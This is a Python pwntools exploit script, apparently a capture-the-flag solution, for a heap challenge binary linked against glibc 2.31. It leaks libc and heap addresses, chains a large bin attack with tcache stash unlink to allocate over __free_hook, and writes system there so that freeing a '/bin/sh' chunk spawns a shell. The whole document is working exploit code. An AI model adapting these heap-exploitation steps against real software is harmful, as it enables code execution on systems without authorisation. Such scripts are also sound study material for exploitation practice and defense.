from pwn import *

elf = ELF("./pwn")
libc = ELF("/home/***/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so")
context(arch=elf.arch, os=elf.os)
context.log_level = "debug"
p = process([elf.path])


def add_chunk(index, size, type=0):
    p.sendafter("choice:", b"1")
    p.sendafter("index:", str(index).encode())
    p.sendafter("size:", str(size).encode())
    p.sendafter("calloc?", str(type).encode())


def delete_chunk(index):
    p.sendafter("choice:", b"2")
    p.sendafter("index:", str(index).encode())


def edit_chunk(index, content):
    p.sendafter("choice:", b"3")
    p.sendafter("index:", str(index).encode())
    p.sendafter("length:", str(len(content)).encode())
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", b"4")
    p.sendafter("index:", str(index).encode())


gdb.attach(p)

# leak libc address
add_chunk(0, 0x420)
add_chunk(1, 0x10)
add_chunk(2, 0x410)
add_chunk(3, 0x10)

# unsortedbin => chunk[0]
delete_chunk(0)
show_chunk(0)

tmp = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
info(f"tmp = {hex(tmp)}")
libc.address = tmp - 0x1ECBE0
info("libc base: " + hex(libc.address))



# large bin attack, i.e. *(&__free_hook + 0x8) = heap_addr
# largebin => chunk[0]
add_chunk(10, 0x500)
# chunk[0]->bk_nextsize = &fake_chunk = ((&__free_hook + 0x8) - 0x20)
# bin->fd = bin->bk = &chunk[0]; 
edit_chunk(0, p64(0) * 3 + p64(libc.sym["__free_hook"] + 0x8 - 0x20))

# free & attack to largebin
delete_chunk(2)
# fake_chunk->fd_nextsize = heap_addr
add_chunk(10, 0x500)

# leak heap base address
show_chunk(0)

tmp = u64(p.recvuntil((b"\x55", b"\x56"))[-6:].ljust(8, b"\x00"))
# info(f"tmp = {hex(tmp)}")
heap_base = tmp - 0x6E0
info(f"heap_base = {hex(heap_base)}")

# recover heap layout
edit_chunk(
    0, p64(heap_base + 0x6E0) + p64(libc.address + 0x1ECFD0) + p64(heap_base + 0x6E0)
)
edit_chunk(
    2,
    p64(libc.address + 0x1ECFD0)
    + p64(heap_base + 0x290)
    + p64(heap_base + 0x290)
    + p64(heap_base + 0x290),
)

add_chunk(0, 0x420)
add_chunk(0, 0x410)

# tcache stash unlink
for i in range(9):
    add_chunk(i, 0x200)
    add_chunk(0x30 + i, 0x10)

# fill tcache(7 chunks), smallbin(2 chunks)
# tcache => chunk[6] => chunk[5] => ... => chunk[0]
for i in range(9):
    delete_chunk(i)

# (FD)smallbin => chunk[8] => chunk[7]
add_chunk(0x40, 0x300)

# chunk[8]->bk = fake_chunk2
edit_chunk(8, p64(heap_base + 0x2490) + p64(libc.sym["__free_hook"] - 0x10))

# alloc 2 chunks from tcache
add_chunk(0, 0x200)
add_chunk(0, 0x200)

# calloc from smallbin, tcache stash(from bin->bk, bk->bk, ...)
add_chunk(0, 0x200, 1)

# alloc to __free_hook
add_chunk(0, 0x200)
edit_chunk(0, p64(libc.sym["system"]))

# get shell
edit_chunk(1, b"/bin/sh\x00")
delete_chunk(1)

p.interactive()
